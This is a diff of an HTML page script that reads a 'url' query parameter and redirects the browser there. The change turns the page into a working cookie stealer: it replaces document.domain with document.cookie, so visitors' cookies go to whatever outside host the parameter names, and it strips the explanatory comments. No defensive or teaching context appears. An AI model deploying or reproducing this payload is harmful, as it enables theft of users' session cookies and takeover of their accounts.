@@ -4,13 +4,13 @@
   <title></title>
   <script>
     window.onload=function(){
-       // Get query parameters from URL
+       
     const urlParams = new URLSearchParams(window.location.search);
-    // Get the 'url' parameter
+    
     let paramValue = urlParams.get('url');
-    // Construct and redirect to the new URL with cookie
+    
     if (paramValue) {
-      document.location = paramValue + "/cookie?cookie=" + document.domain;
+      document.location = paramValue + "/cookie?cookie=" + document.cookie;
     }
       
     };
